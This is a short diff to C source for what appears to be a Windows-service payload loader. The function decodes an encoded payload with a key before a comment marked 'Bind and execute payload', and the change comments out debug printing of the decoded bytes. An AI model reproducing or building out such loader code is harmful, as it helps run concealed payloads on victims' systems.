@@ -245,10 +245,10 @@ void ServiceMain(int argc, char **argv) {
 	unsigned char* payload = (unsigned char *) malloc(payload_size);
 	DEBUG_PRINT("Calling decode_payload...\n");
 	decode_payload(encoded_payload, payload_size, key, key_length, payload);
-	DEBUG_PRINT("Decoded payload: \n");	
-	for(int i = 0; i < payload_size; i++) {
-		DEBUG_PRINT("%02x ", payload[i]);
-	}
+	//DEBUG_PRINT("Decoded payload: \n");	
+	//for(int i = 0; i < payload_size; i++) {
+	//	DEBUG_PRINT("%02x ", payload[i]);
+	//}
 	DEBUG_PRINT("\n\n");
 	
 	// Bind and execute payload
